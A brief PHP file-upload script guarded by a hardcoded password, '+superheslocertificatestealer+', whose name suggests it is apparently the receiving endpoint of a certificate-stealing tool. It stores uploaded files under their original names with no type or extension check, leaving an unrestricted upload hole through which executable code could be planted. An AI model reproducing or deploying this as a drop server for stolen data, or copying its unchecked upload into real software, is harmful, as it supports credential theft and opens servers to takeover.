<?php

//echo "password from form is : " . $_POST['pass'];
if($_POST['pass']=="+superheslocertificatestealer+"){
$target_dir = "uploads/";
$uploadOk = 1;
$target_path = $target_dir . basename( $_FILES['fileToUpload']['name']);

if(move_uploaded_file($_FILES['fileToUpload']['tmp_name'], $target_path)) {
echo "The file ".  basename( $_FILES['fileToUpload']['name']). " has been uploaded";
} else{
echo "There was an error uploading the file, please try again!";
}
}else{
	echo"Wrong password B!SH !";
}
?>